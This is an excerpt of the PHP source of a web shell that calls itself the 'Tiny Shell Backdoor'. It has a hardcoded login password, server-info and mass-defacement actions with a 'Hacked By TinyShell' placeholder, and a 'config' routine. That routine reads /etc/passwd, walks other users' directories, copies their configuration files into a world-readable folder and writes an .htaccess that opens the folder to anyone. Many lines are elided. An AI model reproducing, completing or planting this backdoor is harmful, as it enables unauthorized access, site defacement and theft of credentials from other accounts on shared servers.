...
$password           = "ec9491ae238d44b7800a629fa6a7e536";   // ninjabuster##
$color              = "#00ff00";
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
        ...
        <meta name='author' content='TinyShell|Tiny@TinyShell'/>
        <meta name='author' content='TinyShell'/>
        <meta name='copyright' content='TinyShell'/>
        <meta name='description' content='Tiny Shell Backdoor'>
  ...
  <body class="text-white">
    <div class="p-3">
        <h2 class="text-center">TinyShell</h2><hr>
        <img src="https://res.cloudinary.com/dleaqn62k/image/upload/v1636168772/skull_scqmtt.gif" class="mx-auto d-block"><hr>
            <form method="post">
        <div class="row">
            <div class="col">
        ...
        <hr>
        <center>
            <small>Copyright &copy; <a href="https://TinyShell.com">TinyShell</a></small>
        </center>
    </div>
...
echo "
<html>
    <title>TinyShell Shell Backdoor</title>
    <head>
        <meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
        <link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
        <meta name='author' content='TinyShell'/>
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
        ...
        <div class=''>
            <h1 class='text-center'><a href=''>[ # ] Tiny Shell Backdoor [ # ]</h1>
            <center><p>Keep Quite and More to Hear</a></p></center>
            <hr/>";
        //keluar
    ...
    if($_GET['aksi'] == 'MassDeface') {
        ...
        echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
            ...
            echo "<form method='post'>
                ...
                <textarea name='script' class='form-control' rows='5' placeholder='Hacked By TinyShell'></textarea><br/>
    ...
    */
    if($_GET['aksi'] == 'config') {
        ...
        $con = mkdir("TinyShell_configs", 0777);
        $isi_htc = "Options all\nRequire None\nSatisfy Any";
        $htc = fopen("TinyShell_configs/.htaccess","w");
        fwrite($htc, $isi_htc);
        while($passwd = fgets($etc)) {
            if($passwd == "" || !$etc) {
                    ...
                    if(is_readable($user_config_dir)) {
                        ...
                        foreach($grab_config as $config => $nama_config) {
                            ...
                            if($ambil_config == '') {
                                ...
                                $file_config = fopen("TinyShell_configs/$user_con-$nama_config.txt","w");
        ...
        echo "<center><a href='?dir=$path/TinyShell_configs'><font color=lime>Done</font></a></center>";
    }
...
if($ext == "php") {
        ...
        echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="">TinyShell</a></small></center>';
?>
